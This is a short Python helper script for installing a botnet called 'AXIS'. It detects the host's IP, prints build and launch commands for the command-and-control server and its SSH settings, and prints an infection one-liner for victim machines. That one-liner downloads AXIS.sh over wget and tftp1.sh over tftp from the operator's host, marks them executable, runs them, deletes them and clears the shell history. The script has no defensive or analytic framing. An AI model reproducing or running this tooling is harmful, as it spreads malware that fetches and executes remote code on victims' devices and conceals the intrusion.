import socket
import subprocess
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
subprocess.run("clear")

print("""
#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#
#  Welcome to the AXIS Botnet Installation  #
#  Please follow the steps                  #
#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#

[ INFO ] sudo python3 build.py AXIS_CC.c """+ip+"""
[ INFO ] gcc AXIS_CNC.c -o AXIS -pthread
[ INFO ] sudo screen ./AXIS 606 1 909

[ INFO ] SSH Config:
[ INFO ] ADDR: """+ip+"""
[ INFO ] PORT: 909
[ INFO ] TYPE: RAW

[ INFO ] Coded by @i_am_unbekannt""")
print("[ INFO ] Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
s.close()